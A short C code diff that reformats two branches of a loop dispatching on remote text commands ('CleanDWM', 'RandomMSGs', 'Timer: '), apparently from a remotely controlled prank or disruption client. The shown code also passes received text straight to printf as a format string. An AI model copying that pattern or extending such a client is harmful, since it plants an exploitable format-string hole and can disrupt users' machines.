@@ -372,13 +372,8 @@ int main() {
             Sleep(20000);
         }
 
-        else if (strstr(reqtextbuffer, "CleanDWM")) {
-            cleandwm();
-        }
-
-        else if (strstr(reqtextbuffer, "RandomMSGs")) {
-            msgbox();
-        }
+        else if (strstr(reqtextbuffer, "CleanDWM")) {cleandwm();}
+        else if (strstr(reqtextbuffer, "RandomMSGs")) {msgbox();}
 
         else if (strstr(reqtextbuffer, "Timer: ")) {
             printf(reqtextbuffer);
